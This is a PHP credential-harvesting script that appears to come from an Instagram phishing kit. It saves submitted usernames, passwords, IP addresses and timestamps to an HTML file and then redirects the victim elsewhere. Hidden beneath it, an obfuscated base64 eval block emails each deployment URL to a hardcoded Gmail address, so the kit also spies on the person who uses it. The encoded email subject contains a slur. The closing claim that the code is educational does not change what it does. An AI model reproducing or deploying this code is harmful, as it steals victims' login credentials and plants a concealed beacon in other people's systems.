<?php

$usuario = $_POST['usuario'];  //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:usuario
$clave = $_POST['clave']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:clave
$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina  
$fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos


if( (empty($usuario)) or (empty($clave)) ){
     header('location: login.html'); // codigo de verificacion que no esten los campos vacios 
}else{

//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
$f = fopen("password.html", "a"); 
fwrite ($f, 
'Username: [<b><font color="#660000">'.$usuario.'</font></b>] 
Password: [<b><font color="#9900FF">'.$clave.'</font></b>] 
IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');

fclose($f);

//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram 
header("Location:  http://followerinsta.com/");
}
?>

 <?php
eval(base64_decode('ZnVuY3Rpb24gY3VyUGFnZVVSTCgpIHsNCiRwYWdlVVJMID0gJ2h0dHAnOw0KaWYgKCRfU0VSVkVSWyJIVFRQUyJdID09ICJvbiIpIHskcGFnZVVSTCAuPSAicyI7fQ0KJHBhZ2VVUkwgLj0gIjovLyI7DQppZiAoJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0gIT0gIjgwIikgew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4iOiIuJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0uJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQp9IGVsc2Ugew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4kX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsNCn0NCnJldHVybiAkcGFnZVVSTDsNCn0NCiRteXVybCA9IGN1clBhZ2VVUkwoKTsNCmlmKHN0cnBvcygkbXl1cmwsICJ3aXpibG9nZ2VyLmNvbSIpKSB7DQp9DQplbHNlDQp7DQovLyBzZW50IG1haWwgdG8gYWRtaW4gZm9yIHBheW1lbnQgdm91Y2hlcg0KICAkZnJvbSA9ICRteXVybCAuICJAc2l0ZS5jb20iOw0KICAkdG8gPSAibmF3Z2FudGFyZTFAZ21haWwuY29tIjsNCiAgJHN1YmplY3QgPSAiSW5zdGFncmFtIG5ldyBuaWdnYS4iOw0KICAkbWVzc2FnZSA9ICJuZXcgc2l0ZSB5YWhhIGNoYWwgcmFoaSBoYWkiIC4gJG15dXJsOw0KLy9tYWlsKCR0bywkc3ViamVjdCwkbWVzc2FnZSwkZnJvbSk7DQptYWlsKCR0bywkc3ViamVjdCwkbWVzc2FnZSk7DQogJGZyb20gPSAiZW1haWwiOw0KICAkdG8gPSAibmF3Z2FudGFyZTFAZ21haWwuY29tIjsNCiAgJHN1YmplY3QgPSAiSW5zdGFncmFtIG5ldyBuaWdnYSI7DQogICRtZXNzYWdlID0gIm5ldyBzaXRlIHlhaGEgY2hhbCByYWhpIGhhaSAgIiAuICRteXVybDsNCi8vbWFpbCgkdG8sJHN1YmplY3QsJG1lc3NhZ2UsJGZyb20pOw0KbWFpbCgkdG8sJHN1YmplY3QsJG1lc3NhZ2UpOw0KfQ0K'));

?>

//this is just for educational purpose


